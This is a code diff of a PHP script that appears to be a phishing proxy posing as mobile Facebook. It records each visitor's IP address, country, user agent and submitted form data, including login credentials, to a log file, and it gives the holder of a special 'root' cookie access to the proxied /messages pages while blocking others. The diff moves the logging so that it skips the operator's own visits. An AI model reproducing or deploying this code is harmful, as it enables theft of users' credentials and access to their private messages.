@@ -19,25 +19,27 @@ if (isset($_GET['reset_cookie'])) {
 	header("location:?ref=reset_cookie");
 	die;
 }
-$ip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
-$country = isset($_SERVER['HTTP_CF_IPCOUNTRY']) ? $_SERVER['HTTP_CF_IPCOUNTRY'] : null;
-$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null;
-file_put_contents("logs_fb.txt", json_encode([
-		"dt"=>date("Y-m-d H:i:S"),
-		"ip" => $ip,
-		"country"=>$country,
-		"ua"=>$ua,
-		"post"=>$_POST,
-		"url"=>(isset($_GET['url']) ? fixurl(urldecode($_GET['url'])) : "https://m.facebook.com")
-	], 128)."\n\n", FILE_APPEND | LOCK_EX);
 if (isset($_GET['root'])) {
-
 	setcookie("root", 1, time()+(3600*2), '/', '.crayner.cf', 1, 1);
+	header("location:?url=/messages");
 	die;
 }
-if (!isset($_COOKIE['root']) and isset($_GET['url']) and strpos($_GET['url'], "messages")!==false) {
-	http_response_code(403);
-	die("403 Forbidden ! (Anda tidak memiliki akses ke sumber daya ini)");
+if (!isset($_COOKIE['root'])) {
+	$ip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
+	$country = isset($_SERVER['HTTP_CF_IPCOUNTRY']) ? $_SERVER['HTTP_CF_IPCOUNTRY'] : null;
+	$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null;
+	file_put_contents("logs_fb.txt", json_encode([
+			"dt"=>date("Y-m-d H:i:Y"),
+			"ip" => $ip,
+			"country"=>$country,
+			"ua"=>$ua,
+			"post"=>$_POST,
+			"url"=>(isset($_GET['url']) ? fixurl(urldecode($_GET['url'])) : "https://m.facebook.com")
+		], 128)."\n\n", FILE_APPEND | LOCK_EX);
+	if (isset($_GET['url']) and strpos($_GET['url'], "messages")!==false){
+		http_response_code(403);
+		die("403 Forbidden ! (Anda tidak memiliki akses ke sumber daya ini)");
+	}
 }
 run($_GET['url']??"");
 function fixurl($url)
